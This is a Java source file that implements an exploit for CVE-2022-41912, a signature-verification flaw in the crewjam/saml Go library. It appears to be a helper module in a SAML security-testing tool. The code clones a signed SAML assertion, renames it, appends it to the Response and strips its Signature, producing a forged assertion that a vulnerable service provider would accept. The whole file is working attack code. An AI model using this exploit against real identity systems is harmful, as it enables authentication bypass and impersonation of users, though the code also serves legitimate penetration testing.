package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;

/// Links:
/// * CVE-2022-41912: https://nvd.nist.gov/vuln/detail/CVE-2022-41912
/// * Vulnerable Library: crewjam/saml (Go)
/// * Description: The library verifies the signature of the first assertion but may consume data from a subsequent assertion.
public class CVE_2022_41912 {

    public static final String CVE = "CVE-2022-41912";

    public static String apply(String samlMessage) throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        // the xml must contain a response
        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
        if (response == null) {
            throw new IllegalArgumentException("No 'Response' element found.");
        }

        // get the first assertion (the true one)
        Element originalAssertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
        if (originalAssertion == null) {
            throw new IllegalArgumentException("No 'Assertion' element found.");
        }

        // we can then copy it to create our fake assertion
        Element maliciousAssertion = (Element) originalAssertion.cloneNode(true);

        // I think it's better to change the ID of the fake assertion
        String originalID = maliciousAssertion.getAttribute("ID");
        if (!originalID.isEmpty()) {
            maliciousAssertion.setAttribute("ID", originalID + "_attack");
        } else {
            maliciousAssertion.setAttribute("ID", "attack_assertion_" + System.currentTimeMillis());
        }

        response.appendChild(maliciousAssertion);

        // finally we have to remove to signature so the parser will not see that its fake
        // --- SUPPRESSION PROPRE DE LA SIGNATURE ET DES ESPACES ---
        NodeList children = maliciousAssertion.getChildNodes();
        for (int i = 0; i < children.getLength(); i++) {
            Node child = children.item(i);

            // On cherche l'élément Signature
            if (child.getNodeType() == Node.ELEMENT_NODE && "Signature".equals(child.getLocalName())) {

                // 1. Identifier et supprimer le nœud de texte (espace/indentation) JUSTE AVANT la signature
                Node prev = child.getPreviousSibling();
                if (prev != null && prev.getNodeType() == Node.TEXT_NODE && prev.getTextContent().trim().isEmpty()) {
                    maliciousAssertion.removeChild(prev);
                }

                // 2. Supprimer la signature elle-même
                maliciousAssertion.removeChild(child);

                // On arrête la boucle car on a trouvé et tué la cible
                break;
            }
        }

        return xmlHelpers.getString(document);
    }

    private CVE_2022_41912() {
        // static class
    }
}